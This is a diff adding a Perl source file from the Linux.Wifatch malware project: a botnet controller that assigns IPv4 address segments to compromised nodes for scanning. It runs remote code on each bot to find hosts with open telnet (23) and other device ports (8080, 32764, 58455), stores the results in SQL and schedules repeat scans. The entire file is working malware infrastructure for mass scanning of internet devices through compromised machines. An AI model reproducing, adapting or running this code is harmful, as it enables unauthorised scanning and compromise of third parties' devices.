@@ -1,0 +1,141 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# scan ipv4 address "segments" for open ports (typically 23)
+
+use lib "/mnt/u1/hen57/hak";
+
+use EV       ();
+use Errno    ();
+use CBOR::XS ();
+use Coro;
+use Socket ();
+
+use strict;
+use bm::cc;
+use bm::sql;
+use bm::pool;
+use bm::nolimits;
+
+my %scanner;
+my %scanning;
+my %seg;
+my $queue = new Coro::Channel 4;
+my $TEST  = 0;
+my ($ltad, $ltac);
+
+sub addscanner
+{
+	my ($conn) = @_;
+
+	warn "adding scanner $conn->{name}\n";
+
+	local $scanner{ $conn->{name} } = $Coro::current;
+
+	my $job = $queue->get;
+	my ($seg, $port) = @$job;
+
+	delete $seg{ $seg, $port };
+	local $seg{ $seg, $port } = 1;
+
+	warn "$conn->{name} scan $port:$seg\n";
+
+	my $start = AE::now;
+	my $count = 0;
+
+	$conn->c_eval('
+#		my $mem = bn::func::get_mem 14, 60
+#			or return;
+		use bn::segscan;
+		bn::segscan::run ($_[0], $_[1], $reply);
+		$reply->();
+	', $seg, $port);
+
+	while (my $res = $conn->reply) {
+		for (@$res) {
+			++$count;
+
+			my $now = int AE::now;
+
+			my $ipn = unpack "N", $_;
+			sql_exec "insert ignore into scan$port (last,next,ip,state) values (?,?,?,?)", $now, $now, $ipn, "L";
+
+			sql_exec "update scan$port set next = ?
+                   where next > ? and fail > 0
+                         and (state = 'S' or state = 'L')
+                         and ip = ?", $now, $now, $ipn;
+		}
+
+		#printf "%-21s %5d:%5d %5d\n", $conn->{name}, $seg, $port, $count;
+	}
+
+	my $duration = AE::now - $start;
+
+	$ltad += $duration;
+	++$ltac;
+
+	warn "finished seg $port:$seg with count $count found in $duration seconds (lta ", $ltad / $ltac, ").\n";
+
+	sql_exec "update seg set last = ?, found = ? where id = ? and port = ?", $start, $count, $seg, $port
+		unless $TEST;
+}
+
+# some code not shown to protect the innocent
+
+$TEST
+	or bm::pool::pool "down >= 2000000 and up >= 2000000 and mem >= 8000", $ARGV[0] || 400, sub {
+	my ($conn) = @_;
+
+	addscanner $conn;
+	};
+
+async {
+	while () {
+		my $st = sql_exec
+			\my ($seg, $port),
+			"select id, port
+          from seg where last <= ? - 3600 *
+											case port
+												when    23 then 23
+												when  8080 then 23 + 24 * 14
+												when 32764 then 23 + 24 * 14
+												when 58455 then 23 + 24 * 30
+												else 23 + 24 * 21
+											end
+          order by last", int AE::now;
+
+		warn "feeding ", $st->rows, " segments\n";
+
+		my $wait = 1;
+
+		while ($st->fetch) {
+			next if exists $seg{ $seg, $port };
+			$seg{ $seg, $port } = 1;
+			undef $wait;
+			$queue->put([$seg, $port]);
+		}
+
+		Coro::AnyEvent::sleep 600
+			if $wait;
+	}
+};
+
+EV::run;
+
